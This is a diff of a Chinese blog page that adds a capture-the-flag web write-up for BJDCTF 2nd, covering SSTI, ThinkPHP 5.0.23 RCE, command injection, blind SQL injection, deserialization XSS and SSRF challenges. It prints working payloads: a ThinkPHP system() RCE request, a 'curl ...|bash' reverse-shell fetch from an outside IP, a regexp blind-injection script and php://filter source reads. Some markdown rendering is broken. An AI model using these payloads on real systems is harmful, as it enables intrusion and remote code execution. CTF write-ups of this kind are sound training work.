@@ -6,20 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://passbl.gitee.io/blog">
-  <title>BL&#39;s blog</title>
+  <title>BJDCTF2nd | BL&#39;s blog</title>
   <meta name="generator" content="hexo-theme-yilia-plus">
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   
-    
-    <!-- <meta name="keywords" content="">
-    <meta name="description" content=""> -->
-  
-  <meta property="og:type" content="website">
-<meta property="og:title" content="BL&#39;s blog">
-<meta property="og:url" content="https://passbl.gitee.io/blog/index.html">
+  <meta name="description" content="web WP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BJDCTF2nd">
+<meta property="og:url" content="https://passbl.gitee.io/blog/2020/05/25/BJDCTF2nd-web-WP/index.html">
 <meta property="og:site_name" content="BL&#39;s blog">
+<meta property="og:description" content="web WP">
 <meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-05-25T09:36:35.000Z">
+<meta property="article:modified_time" content="2020-05-25T09:49:55.498Z">
 <meta property="article:author" content="BL">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
   
     <link rel="alternative" href="/blog/atom.xml" title="BL&#39;s blog" type="application/atom+xml">
@@ -221,25 +222,25 @@
               class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-
-  
-    <article id="post-BJDCTF2nd-web-WP" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+            <article id="post-BJDCTF2nd-web-WP" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
   
   
-    <h1 itemprop="name">
-	
-	  <a class="article-title" href="/blog/2020/05/25/BJDCTF2nd-web-WP/" target="_blank">BJDCTF2nd</a>
-  
+    <h1 class="article-title" itemprop="name">
+      BJDCTF2nd
     </h1>
   
 
 
   
   
+        
+        <span id="busuanzi_container_page_pv" style='display:none' class="archive-article-date">
+              <i class="icon-smile icon"></i> 阅读数：<span id="busuanzi_value_page_pv"></span>次
+        </span>
+
 <a href="/blog/2020/05/25/BJDCTF2nd-web-WP/" class="archive-article-date">
         <time datetime="2020-05-25T09:36:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-25</time>
 </a>
@@ -247,20 +248,167 @@
   
   
     
+<div style="margin-top:10px;">
+  <span class="post-time">
+    <span class="post-meta-item-icon">
+      <!-- fonts.scss -->
+      <!-- 百度字体平台:http://fontstore.baidu.com/static/editor/index.html -->
+      <i class="icon-statistics"></i>
+      <span class="post-meta-item-text"> 字数统计:</span>
+      <span class="post-count">2.4k字</span>
+    </span>
+  </span>
+
+  <span class="post-time">
+    &nbsp; | &nbsp;
+    <span class="post-meta-item-icon">
+      <i class="icon-book icon"></i>
+      <span class="post-meta-item-text"> 阅读时长≈</span>
+      <span class="post-count">11分</span>
+    </span>
+  </span>
+</div>
+
 
   
   </header>
   
   <div class="article-entry" itemprop="articleBody">
     
-    <h3 id="web-WP"><a href="#web-WP" class="headerlink" title="web WP"></a>web WP</h3>
-    
-    <a class="article-more-a" href="/blog/2020/05/25/BJDCTF2nd-web-WP/#more">more >></a>
-    
-    
+    <h3 id="web-WP"><a href="#web-WP" class="headerlink" title="web WP"></a>web WP</h3><a id="more"></a>
+<h3 id="fake-google"><a href="#fake-google" class="headerlink" title="fake google"></a>fake google</h3><p>考点:SSTI模板注入</p>
+<ul>
+<li>验证漏洞<br><code>4</code></li>
+<li>返回内容4,可确定是ssti，直接读取根目录下的flag</li>
+</ul>
+<p>pyload:</p>
+<figure class="highlight plain"><figcaption><span>for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">### old-hack</span><br><span class="line">打开题目发现是一个h页，亮点在&#96;powerded by thinkphp5&#96;</span><br><span class="line">- 可以报错来获取具体版本</span><br><span class="line">- Tinkphp5.0.23rce漏洞直接拿flag</span><br><span class="line"></span><br><span class="line">payload:</span><br></pre></td></tr></table></figure>
+<p>GET /index.php?s=captcha<br>POST _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=cat /flag<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">### duangShell</span><br><span class="line"></span><br><span class="line">题目说.swp，考虑vim泄露</span><br><span class="line">下载源码</span><br><span class="line"></span><br><span class="line"> &#96;&#96;&#96;php</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;珍爱网&lt;&#x2F;h1&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">echo &quot;how can i give you source code? .swp?!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">if (!isset($_POST[&#39;girl_friend&#39;])) &#123;</span><br><span class="line">    die(&quot;where is P3rh4ps&#39;s girl friend ???&quot;);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $girl &#x3D; $_POST[&#39;girl_friend&#39;];</span><br><span class="line">    if (preg_match(&#39;&#x2F;\&gt;|\\\&#x2F;&#39;, $girl)) &#123;</span><br><span class="line">        die(&#39;just girl&#39;);</span><br><span class="line">    &#125; else if (preg_match(&#39;&#x2F;ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$&#x2F;i&#39;, $girl)) &#123;</span><br><span class="line">        echo &quot;&lt;img src&#x3D;&#39;img&#x2F;p3_need_beautiful_gf.png&#39;&gt; &lt;!-- He is p3 --&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        &#x2F;&#x2F;duangShell~~~~</span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>代码审计</p>
+<ul>
+<li>源码两次对<code>$_POST[&#39;girl_friend&#39;]</code>进行了过滤，不能直接读flag</li>
+<li>这里利用反弹shell来读取flag</li>
+<li>首先在buu上basic里启动一个linux labs，并开启apache</li>
+<li>在apache根目录写一个反弹shell命名为bl.txt</li>
+<li>再监听所设置端口，并在题目中传入<code>girl_friend=curl http://174.1.51.157/bl.txt|bash</code>获得反弹shell，再读flag。</li>
+</ul>
+<h3 id="假猪套天下第一"><a href="#假猪套天下第一" class="headerlink" title="假猪套天下第一"></a>假猪套天下第一</h3><p>打开题目是个登录页面，可随意登录，但是登录后没什么用</p>
+<ul>
+<li>登录时抓包在登陆后跳转页面的返回包中发现<code>L0g1n.php</code></li>
+<li>打开页面发现一系列的改http头，<blockquote>
+<p>1，抓包时发现<code>cookie</code>中存在一个time时间戳，尝试改变绕过<br>2，client-ip:localhost/127.0.0.1（过滤了xff,利用）<br>3，Referer:gem-love.coms<br>4，User-Agent:Commodore 64 (这里题目中只给了<code>Commodo 64</code>,有点,,,)<br>5，from:<a href="mailto:root@gem-love.com">root@gem-love.com</a><br>6，via:y1ng.vip</p>
+</blockquote>
+</li>
+</ul>
+<p>最后在源码中发现一段被注释的base64，解码得flag</p>
+<h3 id="简单注入"><a href="#简单注入" class="headerlink" title="简单注入"></a>简单注入</h3><ul>
+<li>刚看到题目发现之前遇见过一次，不过改简单了。<a href="http://www.freesion.com/article/2367234678/" target="_blank" rel="noopener">原题WP</a></li>
+<li>回到题目，是一个登录框，尝试admin/admin返回<code>用户名或密码错误</code></li>
+<li>经过bypass发现，过滤了<code>&#39;,&amp;,-,=</code>等特殊字符。</li>
+<li>因为这里过滤了<code>=</code>，就考虑了正则盲注-regexp<a href="http://www.freesion.com/article/2367234678/" target="_blank" rel="noopener">参考文章</a></li>
+<li>尝试传<code>username=\&amp;password=||1#</code>,发现返回“BJD needs to be stronger”，原题中过滤了<code>#</code>，此题没有，这样就简单多了</li>
+<li>注:这里数据分大小写所以用<code>regexp binary</code>来匹配区分大小写。</li>
+</ul>
+<p>exp：<br> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">res =  requests.session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://e240cf6c-5dc2-4fc0-a740-c4b9da1d1e85.node3.buuoj.cn/index.php'</span></span><br><span class="line"></span><br><span class="line">post = &#123;<span class="string">"username"</span>:<span class="string">"\\"</span>,<span class="string">"password"</span>:<span class="string">"&#123;&#125;"</span>&#125;</span><br><span class="line"></span><br><span class="line">a1 = <span class="string">'0x5e'</span></span><br><span class="line">a2 = <span class="string">'.?^*+$'</span></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">		<span class="keyword">if</span> chr(i) <span class="keyword">in</span> a2:</span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			a3 = str(hex(i)).replace(<span class="string">'0x'</span>,<span class="string">''</span>)</span><br><span class="line">			payload = <span class="string">'|| password regexp binary &#123;&#125;#'</span>.format(a1+a3) </span><br><span class="line">			post[<span class="string">'password'</span>] = payload			</span><br><span class="line">			res = res.post(url,data=post)</span><br><span class="line">			<span class="keyword">if</span> <span class="string">"BJD needs to be stronger"</span> <span class="keyword">in</span> res.text:</span><br><span class="line">				result = result+chr(i)</span><br><span class="line">				print(result)	</span><br><span class="line">				a1 = a1+a3</span><br><span class="line">				<span class="keyword">break</span>    <span class="comment">#result=OhyOuFOuNdit</span></span><br></pre></td></tr></table></figure></p>
+<p> 跑出账号密码，登录getflag。</p>
+<h3 id="xss之光"><a href="#xss之光" class="headerlink" title="xss之光"></a>xss之光</h3><p>.git泄露，下载源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'yds_is_so_beautiful'</span>];</span><br><span class="line"><span class="keyword">echo</span> unserialize($a);</span><br></pre></td></tr></table></figure>
+<p>是个反序列化，经过一番搜索发现是原生类反序化<br><a href="https://www.cnblogs.com/iamstudy/articles/unserialize_in_php_inner_class.html" target="_blank" rel="noopener">参考文章</a><br>本地构造payload并<code>url</code>编码，传给<code>yds_is_so_beautiful</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="keyword">new</span> <span class="keyword">Exception</span>(<span class="string">"&lt;script&gt;alert(1)&lt;/script&gt;"</span>);</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> urlencode($b);</span><br></pre></td></tr></table></figure>
+<p>最后在本地cookie中拿flag</p>
+<h3 id="Schrödinger"><a href="#Schrödinger" class="headerlink" title="Schrödinger"></a>Schrödinger</h3><p>打开题目一堆英文(不得不说一下，本次比赛感觉在挑战我的英语)</p>
+<ul>
+<li>翻译发现是个解密，破解类程序</li>
+<li>在源码中发现<code>test.php</code>(是一个登录页面)</li>
+<li>试着把此页面扔进去跑，发现多了2个回显，成功率比较低</li>
+<li>最后在<code>cookie</code>中发现一个时间戳，尝试修改发现成功率提高了</li>
+<li>再次尝试删除时间戳，发现成功率<code>%99+</code>，点击<code>cheek</code>，弹出b站av号<br>最后在b站评论区拿到flag</li>
+</ul>
+<h3 id="elementmaster"><a href="#elementmaster" class="headerlink" title="elementmaster"></a>elementmaster</h3><p>个人觉得这道题非常出其不意</p>
+<ul>
+<li>开始在源码中发现2个<code>&lt;p&gt;</code>标签被隐藏，id是16进制，尝试转字符串发现<code>Po.php</code>，访问发现是只有返回一个<code>.</code>。</li>
+<li>然后就没什么头绪了，后面发现题目中图片的名称不太一样，百度后居然是元素周期表，再结合前面得到<code>Po.php</code>，发现除了Po元素之外还有其他元素也存在<code>php</code>文件。写一个脚本尝试爆破</li>
+</ul>
+<p>exp:</p>
+ <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">req = requests.session()</span><br><span class="line">url = <span class="string">"http://00157c88-ef09-44e9-93e8-f01a1f3e4c80.node3.buuoj.cn/"</span></span><br><span class="line">yuansu = [<span class="string">'H'</span>, <span class="string">'He'</span>, <span class="string">'Li'</span>, <span class="string">'Be'</span>, <span class="string">'B'</span>, <span class="string">'C'</span>, <span class="string">'N'</span>, <span class="string">'O'</span>, <span class="string">'F'</span>, <span class="string">'Ne'</span>, <span class="string">'Na'</span>, <span class="string">'Mg'</span>, <span class="string">'Al'</span>, <span class="string">'Si'</span>, <span class="string">'P'</span>, <span class="string">'S'</span>, <span class="string">'Cl'</span>, <span class="string">'Ar'</span>,</span><br><span class="line">         <span class="string">'K'</span>, <span class="string">'Ca'</span>, <span class="string">'Sc'</span>, <span class="string">'Ti'</span>, <span class="string">'V'</span>, <span class="string">'Cr'</span>, <span class="string">'Mn'</span>, <span class="string">'Fe'</span>, <span class="string">'Co'</span>, <span class="string">'Ni'</span>, <span class="string">'Cu'</span>, <span class="string">'Zn'</span>, <span class="string">'Ga'</span>, <span class="string">'Ge'</span>, <span class="string">'As'</span>, <span class="string">'Se'</span>, <span class="string">'Br'</span>, </span><br><span class="line">         <span class="string">'Kr'</span>, <span class="string">'Rb'</span>, <span class="string">'Sr'</span>, <span class="string">'Y'</span>, <span class="string">'Zr'</span>, <span class="string">'Nb'</span>, <span class="string">'Mo'</span>, <span class="string">'Te'</span>, <span class="string">'Ru'</span>, <span class="string">'Rh'</span>, <span class="string">'Pd'</span>, <span class="string">'Ag'</span>, <span class="string">'Cd'</span>, <span class="string">'In'</span>, <span class="string">'Sn'</span>, <span class="string">'Sb'</span>, <span class="string">'Te'</span>, </span><br><span class="line">         <span class="string">'I'</span>, <span class="string">'Xe'</span>, <span class="string">'Cs'</span>, <span class="string">'Ba'</span>, <span class="string">'La'</span>, <span class="string">'Ce'</span>, <span class="string">'Pr'</span>, <span class="string">'Nd'</span>, <span class="string">'Pm'</span>, <span class="string">'Sm'</span>, <span class="string">'Eu'</span>, <span class="string">'Gd'</span>, <span class="string">'Tb'</span>, <span class="string">'Dy'</span>, <span class="string">'Ho'</span>, <span class="string">'Er'</span>, <span class="string">'Tm'</span>, </span><br><span class="line">         <span class="string">'Yb'</span>, <span class="string">'Lu'</span>, <span class="string">'Hf'</span>, <span class="string">'Ta'</span>, <span class="string">'W'</span>, <span class="string">'Re'</span>, <span class="string">'Os'</span>, <span class="string">'Ir'</span>, <span class="string">'Pt'</span>, <span class="string">'Au'</span>, <span class="string">'Hg'</span>, <span class="string">'Tl'</span>, <span class="string">'Pb'</span>, <span class="string">'Bi'</span>, <span class="string">'Po'</span>, <span class="string">'At'</span>, <span class="string">'Rn'</span>, </span><br><span class="line">         <span class="string">'Fr'</span>, <span class="string">'Ra'</span>, <span class="string">'Ac'</span>, <span class="string">'Th'</span>, <span class="string">'Pa'</span>, <span class="string">'U'</span>, <span class="string">'Np'</span>, <span class="string">'Pu'</span>, <span class="string">'Am'</span>, <span class="string">'Cm'</span>, <span class="string">'Bk'</span>, <span class="string">'Cf'</span>, <span class="string">'Es'</span>, <span class="string">'Fm'</span>,<span class="string">'Md'</span>, <span class="string">'No'</span>, <span class="string">'Lr'</span>,</span><br><span class="line">         <span class="string">'Rf'</span>, <span class="string">'Db'</span>, <span class="string">'Sg'</span>, <span class="string">'Bh'</span>, <span class="string">'Hs'</span>, <span class="string">'Mt'</span>, <span class="string">'Ds'</span>, <span class="string">'Rg'</span>, <span class="string">'Cn'</span>, <span class="string">'Nh'</span>, <span class="string">'Fl'</span>, <span class="string">'Mc'</span>, <span class="string">'Lv'</span>, <span class="string">'Ts'</span>, <span class="string">'Og'</span>, <span class="string">'Uue'</span>]</span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> yuansu:</span><br><span class="line">    t1 = url + y +<span class="string">".php"</span></span><br><span class="line">    t2 = req.get(t1)</span><br><span class="line">    <span class="keyword">if</span> t2.status_code == <span class="number">200</span>:</span><br><span class="line">        print(y)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
+<p>最后拼接每个<code>元素.php</code>返回值拼接发现<code>And_th3_3LemEnt5_w1LL_De5tR0y_y0u.php</code>，访问得到flag</p>
+<h3 id="文件探测"><a href="#文件探测" class="headerlink" title="文件探测"></a>文件探测</h3><p>扫描目录得到robots.txt<br>存在</p>
+<blockquote>
+<p>1，flag.php (404)<br>2，admin.php (200)<br>3，index.php (200)</p>
+</blockquote>
+<ul>
+<li>暂无利用点，访问index.php抓包发现<code>hint:home.php</code>，访问时包含了<code>system.php</code></li>
+<li>在<code>system.php</code>中得到次处可以探测文件，有3个可控参数</li>
+<li>回到我们的<code>home.php</code>貌似存在文件包含漏洞，试着用伪协议读取源码<code>?file=php://filter/convert.base64-encode/resource=system</code></li>
+</ul>
+<p><code>system.php</code>源码<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">'y1ng'</span>]) || $_COOKIE[<span class="string">'y1ng'</span>] !== sha1(md5(<span class="string">'y1ng'</span>)))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;script&gt;alert('why you are here!');alert('fxck your scanner');alert('fxck you! get out!');&lt;/script&gt;"</span>;</span><br><span class="line">    header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$filter1 = <span class="string">'/^http:\/\/127\.0\.0\.1\//i'</span>;</span><br><span class="line">$filter2 = <span class="string">'/.?f.?l.?a.?g.?/i'</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'q1'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q2'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'q3'</span>]) ) &#123;</span><br><span class="line">    $url = $_POST[<span class="string">'q2'</span>].<span class="string">".y1ng.txt"</span>;</span><br><span class="line">    $method = $_POST[<span class="string">'q3'</span>];</span><br><span class="line"></span><br><span class="line">    $str1 = <span class="string">"~$ python fuck.py -u \""</span>.$url .<span class="string">"\" -M $method -U y1ng -P admin123123 --neglect-negative --debug --hint=xiangdemei&lt;br&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> $str1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!preg_match($filter1, $url) )&#123;</span><br><span class="line">        <span class="keyword">die</span>($str2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match($filter2, $url)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">'/^GET/i'</span>, $method) &amp;&amp; !preg_match(<span class="string">'/^POST/i'</span>, $method)) &#123;</span><br><span class="line">        <span class="keyword">die</span>($str4);</span><br><span class="line">    &#125;</span><br><span class="line">    $detect = @file_get_contents($url, <span class="keyword">false</span>);</span><br><span class="line">    <span class="keyword">print</span>(sprintf(<span class="string">"$url method&amp;content_size:$method%d"</span>, $detect));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>这里只能读取<code>system.php</code>的源码。</p>
+<ul>
+<li>代码审计发现3个参数可控，并且可以读取源码，尝试读取<code>admin.php</code>的源码。</li>
+<li>但是q2强行加了<code>.y1ng.txt</code>,q3<code>GET/POST</code>后面<code>%d</code>,尝试闭合</li>
+<li><code>q1=aaa&amp;q2=http://localhost/admin.php?a=&amp;q3=GET%s%</code></li>
+</ul>
+<p>得到<code>admin.php</code>源码<br> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="string">'your_ip_address'</span>] === md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="string">'y1ng'</span>] === sha1(md5(<span class="string">'y1ng'</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">'decrypt'</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'爬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<ul>
+<li><p>首先定义了2个方法，并且验证ip是否是本地的，再次判断<code>decrypt</code>是否等于<code>$cipher</code>，等于就输出flag,这里的<code>$cipher</code>变量用了<code>aesEn</code>的方法(openssl加密)。</p>
+</li>
+<li><p>开始的验证ip，就验证我们的<code>phpsessid</code>,此判断也不会影响我们后期读取flag，我们也可以直接删除<code>cookie</code>中的<code>phpsessid</code>来实现绕过</p>
+</li>
+<li><p>本地写一个脚本，实现<code>openssl</code>加密，<code>key</code>为<code>y1ng</code>,<code>iv</code>为我们ip。</p>
